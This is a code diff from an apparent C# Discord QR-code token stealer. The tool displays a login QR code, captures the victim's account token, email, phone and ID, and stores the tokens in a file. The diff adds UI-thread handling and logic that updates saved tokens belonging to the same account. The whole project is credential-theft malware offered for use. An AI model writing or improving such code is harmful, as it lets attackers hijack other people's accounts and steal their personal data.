@@ -407,15 +407,19 @@ namespace Discord_QR_Token_Stealer
                 // reload page
                 chromiumWebBrowser1.Load(chromiumWebBrowser1.Address);
 
-                // clear out the labels
-                lblTag.Text = "Tag";
-                lblEmail.Text = "Email";
-                lblId.Text = "Id";
-                lblPhone.Text = "Phone";
-                lblToken.Text = "Token";
+                // invoke the whole thing because im too lazy to get a better method and im trynna do a push before midnight
+                Invoke((MethodInvoker)(() =>
+                {
+                    // clear out the labels
+                    lblTag.Text = "Tag";
+                    lblEmail.Text = "Email";
+                    lblId.Text = "Id";
+                    lblPhone.Text = "Phone";
+                    lblToken.Text = "Token";
 
-                // clear out the picturebox
-                currentCode.Load("template.png");
+                    // clear out the picturebox
+                    currentCode.Load("template.png");
+                }));
 
                 // clear cookies
                 var cookieManager = chromiumWebBrowser1.GetCookieManager();
@@ -438,6 +442,18 @@ namespace Discord_QR_Token_Stealer
             // make sure it exists, if it does, read it to tokens var
             if (File.Exists("unique.txt"))
                 tokens = File.ReadAllLines("unique.txt").ToList();
+
+            // update any tokens that have the same snowflake
+            for (var x = 0;x < tokens.Count;x++)
+            {
+                var tokenSplit = tokens[x].Split('.');
+
+                if (tokens[x].StartsWith("mfa"))
+                    if (tokens[x].StartsWith(token.Substring(4).Substring(4)))
+                        tokens[x] = token;
+                else if (tokens[x].StartsWith(token.Split('.').First()))
+                    tokens[x] = token;
+            }
 
             // if its not already in there, then add it
             if (!tokens.Contains(token))
